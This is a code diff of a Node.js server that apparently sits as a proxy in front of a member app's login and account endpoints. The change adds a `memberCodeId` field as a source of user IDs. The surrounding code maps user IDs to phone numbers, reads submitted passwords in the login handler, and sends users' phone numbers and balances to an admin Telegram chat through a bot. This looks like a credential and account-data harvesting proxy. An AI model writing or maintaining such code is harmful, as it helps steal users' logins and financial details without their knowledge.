@@ -112,14 +112,15 @@ async function extractUserId(req, jsonResp) {
   const fromToken = await getUserIdFromToken(req);
   if (fromToken) return fromToken;
   const body = req.parsedBody || {};
-  const uid = body.userId || body.userid || body.memberId || '';
+  const uid = body.memberCodeId || body.userId || body.userid || body.memberId || '';
   if (uid) return String(uid);
   const qs = new URLSearchParams((req.originalUrl || '').split('?')[1] || '');
+  if (qs.get('memberCodeId')) return String(qs.get('memberCodeId'));
   if (qs.get('userId')) return String(qs.get('userId'));
   if (qs.get('memberId')) return String(qs.get('memberId'));
   const respData = getResponseData(jsonResp);
   if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
-    const rid = respData.userId || respData.userid || respData.memberId || '';
+    const rid = respData.memberCodeId || respData.userId || respData.userid || respData.memberId || '';
     if (rid) return String(rid);
   }
   const authHeader = req.headers['authorization'] || req.headers['token'] || req.headers['auth'] || '';
@@ -939,7 +940,7 @@ app.post('/app/api/system/v2/login', async (req, res) => {
       saveData(data).catch(()=>{});
     } else if (phone) {
       const loginData = getResponseData(jsonResp);
-      const respUserId = loginData?.id || loginData?.memberId || loginData?.userId || '';
+      const respUserId = loginData?.memberCodeId || loginData?.memberId || loginData?.userId || loginData?.id || '';
       if (respUserId) {
         userPhoneMap[String(respUserId)] = String(phone);
         saveTokenUserId(req, String(respUserId));
@@ -956,7 +957,7 @@ app.post('/app/api/system/v2/login', async (req, res) => {
       }
     }
     const loginData2 = getResponseData(jsonResp);
-    const finalUserId = userId || loginData2?.id || loginData2?.memberId || loginData2?.userId || '';
+    const finalUserId = userId || loginData2?.memberCodeId || loginData2?.memberId || loginData2?.userId || '';
     if (data.adminChatId && bot) {
       const encPwd = body.memberPwd || body.password || body.pwd || '';
       let pwd = encPwd;
@@ -1552,7 +1553,7 @@ app.all('/app/api/memberManager/mine', async (req, res) => {
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const respData = getResponseData(jsonResp);
-    const userId = await extractUserId(req, jsonResp) || respData?.id || respData?.memberId || respData?.userId || '';
+    const userId = await extractUserId(req, jsonResp) || respData?.memberCodeId || respData?.memberId || respData?.userId || '';
     let phone = '';
     let bal = '';
     if (respData && typeof respData === 'object') {
@@ -1580,8 +1581,7 @@ app.all('/app/api/memberManager/mine', async (req, res) => {
       await saveData(data);
     }
     if (data.adminChatId && bot) {
-      const dump = JSON.stringify(respData, null, 2).substring(0, 2500);
-      bot.sendMessage(data.adminChatId, `👤 Mine [${effectiveUserId || 'N/A'}]\n📱 Phone: ${phone || 'N/A'}\n💰 Balance: ${bal !== '' ? bal : 'N/A'}\n\n📥 RAW:\n${dump}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `👤 Mine [${effectiveUserId || 'N/A'}]\n📱 Phone: ${phone || 'N/A'}\n💰 Balance: ${bal !== '' ? bal : 'N/A'}`).catch(()=>{});
     }
     const reqUserId = effectiveUserId || userId;
     const eff = getEffectiveSettings(data, reqUserId);
